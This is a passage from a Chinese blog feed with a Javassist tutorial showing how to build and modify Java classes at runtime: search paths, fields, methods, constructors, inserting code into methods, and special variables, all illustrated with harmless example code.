必须在插入的代码中, 加入return值$e代表异常信息.插入的代码片段必须以throw或return语句结束</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtMethod</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ...;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">etype</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;java.io.IOException&quot;</span>);<br>m.addCatch(<span class="hljs-string">&quot;&#123; System.out.println($e); throw $e; &#125;&quot;</span>, etype);<br><span class="hljs-comment">// 等同于添加如下代码: </span><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// the original method body</span><br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    System.out.println(e);<br>    <span class="hljs-keyword">throw</span> e;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="类搜索路径"><a href="#类搜索路径" class="headerlink" title="类搜索路径"></a>类搜索路径</h1><p>我们前面获取的ClassPool他有自己的类搜索路径，如果程序运行在JBoss或Tomcat等web服务器上，可能会找不到用户自己的类，我们需要手动添加一个类搜索路径。</p><p>下面是各种添加类搜素路径的各种方式</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过ClassClassPath添加路径*/</span><br><span class="hljs-comment">// 将classpath插入到指定classpath之前</span><br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Student.getClass()));<br><span class="hljs-comment">// 将classpath添加到指定classpath之后</span><br>pool.appendClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(<span class="hljs-built_in">this</span>.getClass()));<br></code></pre></td></tr></table></figure><blockquote><p>该方式添加的时候，比如上面的Student.class，可以将class所在的整个jar添加到搜索路径</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*指定目录添加搜索路径*/</span><br><span class="hljs-comment">// 将一个目录作为classpath</span><br>pool.insertClassPath(<span class="hljs-string">&quot;/xxx/lib&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过url指定搜索路径*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">ClassPath</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassPath</span>(<span class="hljs-string">&quot;www.sample.com&quot;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&quot;/out/&quot;</span>, <span class="hljs-string">&quot;com.test&quot;</span>);<br>pool.insertClassPath(cp);<br></code></pre></td></tr></table></figure><blockquote><p>上述代码将<a href="http://www.sample.com/out%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%B1%BB%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84%E3%80%82%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AAURL%E5%8F%AA%E8%83%BD%E6%90%9C%E7%B4%A2%60com.test%60%E5%8C%85%E9%87%8C%E9%9D%A2%E7%9A%84%E7%B1%BB%E3%80%82">http://www.sample.com:80/out添加到类搜索路径。并且这个URL只能搜索`com.test`包里面的类。</a></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过ByteArrayPath添加搜索路径*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">byte</span>[] buf = 字节数组;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> 类名;<br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayClassPath</span>(name, buf));<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.get(name);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*通过输入流加载class*/</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span>  class文件对应的输入流;<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(ins);<br></code></pre></td></tr></table></figure><h1 id="读写字节码"><a href="#读写字节码" class="headerlink" title="读写字节码"></a>读写字节码</h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;test.Rectangle&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><code>ClassPool</code>的<code>getDefault()</code>方法将会查找系统默认的路径来搜索<code>test.Rectable</code>对象，然后将获取到的<code>CtClass</code>对象赋值给cc变量，如果对象没有被找到，那么<code>get()</code>方法就会创建出一个默认的<code>CtClass</code>对象，然后放入到<code>HashTable</code>中，同时将当前创建的对象返回。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] b = cc.toBytecode(); <span class="hljs-comment">//直接获取字节码</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cc.toClass(); <span class="hljs-comment">//获取Class</span><br></code></pre></td></tr></table></figure><p><code>toClass()</code>方法调用使得当前线程中的context class loader加载此CtClass类，然后生成<code>java.lang.Class</code>对象。</p><h1 id="对类的相关操作"><a href="#对类的相关操作" class="headerlink" title="对类的相关操作"></a>对类的相关操作</h1><p>主要还是学一下具体的使用，太深入的东西先不看，参考文章：<a href="https://blog.csdn.net/weixin_54902210/article/details/129562446">https://blog.csdn.net/weixin_54902210/article/details/129562446</a></p><p>这里基于前面创建的Hello类进行操作</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><h2 id="添加属性"><a href="#添加属性" class="headerlink" title="添加属性"></a>添加属性</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtField;<br><span class="hljs-keyword">import</span> javassist.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071630618.png" alt="image-20240907163059547"></p><p>赋值也可以这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ctClass.addField(name,<span class="hljs-string">&quot;name=\&quot;Sentiment\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>但这种赋值偏向于用构造器等进行初始化</p><h2 id="添加方法"><a href="#添加方法" class="headerlink" title="添加方法"></a>添加方法</h2><p>方法可以设置的返回类型</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass booleanType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass charType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass byteType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass shortType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass intType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass longType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass floatType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass doubleType;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass voidType;<br></code></pre></td></tr></table></figure><p>这里不支持直接用String，是因为在java字节码中，参数和返回类型的String一般都是用常量池中字符串的索引值，要设置String类型的话就和前面一样用<strong>classPool.getCtClass(“java.lang.String”)</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br><br>        <span class="hljs-comment">//3.添加方法</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//分别是返回类型，方法名，方法参数，要添加的方法的CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置方法为public</span><br>        ctClass.addMethod(test);<br>        ctClass.writeFile();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071700312.png" alt="image-20240907170022235"></p><h3 id="设置方法体"><a href="#设置方法体" class="headerlink" title="设置方法体"></a>设置方法体</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//1.创建Hello类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br><br>        <span class="hljs-comment">//2.添加属性</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(classPool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        name.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置属性为public</span><br>        ctClass.addField(name,CtField.Initializer.constant(<span class="hljs-string">&quot;Sentiment&quot;</span>));<span class="hljs-comment">//给name变量初始化值Sentiment</span><br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//3.添加方法</span><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;CtClass.intType, CtClass.charType&#125;, ctClass);<span class="hljs-comment">//分别是返回类型，方法名，方法参数，要添加的方法的CtClass</span><br>        ctClass.setModifiers(Modifier.PUBLIC);<span class="hljs-comment">//设置方法为public</span><br>        ctClass.addMethod(test);<br><span class="hljs-comment">//        ctClass.writeFile();</span><br><br>        <span class="hljs-comment">//4.设置方法体</span><br>        test.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;Hello World\&quot;);&quot;</span>);<br>        ctClass.writeFile();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071702140.png" alt="image-20240907170209069"></p><h3 id="方法体前后插入代码"><a href="#方法体前后插入代码" class="headerlink" title="方法体前后插入代码"></a>方法体前后插入代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">test.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;我在前面插入:\&quot;+$1);&quot;</span>);<br>test.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;我在后面插入了:\&quot;+$2);&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071704977.png" alt="image-20240907170453863"></p><h2 id="添加构造器"><a href="#添加构造器" class="headerlink" title="添加构造器"></a>添加构造器</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;classPool.getCtClass(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);<span class="hljs-comment">//分别是参数列表，要添加的CtClass</span><br>cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<span class="hljs-comment">//设置name=var1，也就是第一个参数</span><br>ctClass.addConstructor(cons);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071713061.png" alt="image-20240907171307942"></p><blockquote><p>无参构造去掉中间的参数即可</p></blockquote><h2 id="修改已有类"><a href="#修改已有类" class="headerlink" title="修改已有类"></a>修改已有类</h2><p>用ClassPool获取CtClass之后进行修改，我们对我们我们前面创建的Hello.class进行修改</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//对已有类进行修改</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.insertClassPath(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavassistLearn&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.getConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;changing\&quot;);&#125;&quot;</span>);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071745179.png" alt="image-20240907174508054"></p><p>可以看到成功修改</p><blockquote><p>这里添加类路径的时候要注意在包名的上一层，不然会找不到类，因为get的时候用完整包名会自动添加上路径进行搜索</p><p>比如上面的添加路径为：D:\CTF\Java\JavaCode\JavassistLearn，搜索时就是这样：D:\CTF\Java\JavaCode\JavassistLearn\Temp\Hello.class</p></blockquote><h1 id="一些特殊变量"><a href="#一些特殊变量" class="headerlink" title="一些特殊变量"></a>一些特殊变量</h1><p>就是我们前面使用的$1，$0那些</p><table><thead><tr><th>标识符</th><th>作用</th></tr></thead><tbody><tr><td>$0、$1、$2、 $3等</td><td>this和方法参数（1-N是方法参数的顺序）</td></tr><tr><td>$args</td><td>方法参数数组，类型为Object[]</td></tr><tr><td>$$</td><td>所有方法参数，例如：m($$)相当于m($1,$2,…)</td></tr><tr><td>$cflow(…)</td><td>control flow 变量</td></tr><tr><td>$r</td><td>返回结果的类型，在强制转换表达式中使用。</td></tr><tr><td>$w</td><td>包装器类型，在强制转换表达式中使用。</td></tr><tr><td>$_</td><td>方法的返回值</td></tr><tr><td>$sig</td><td>类型为java.lang.Class的参数类型对象数组</td></tr><tr><td>$type</td><td>类型为java.lang.Class的返回值类型</td></tr><tr><td>$class</td><td>类型为java.lang.Class的正在修改的类</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为看到在缩短payload的时候会用到，赶紧来学习一下，参考文章：&lt;a href=&quot;https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%</summary>
      
    
    
    
    <category term="java基础" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
</feed>
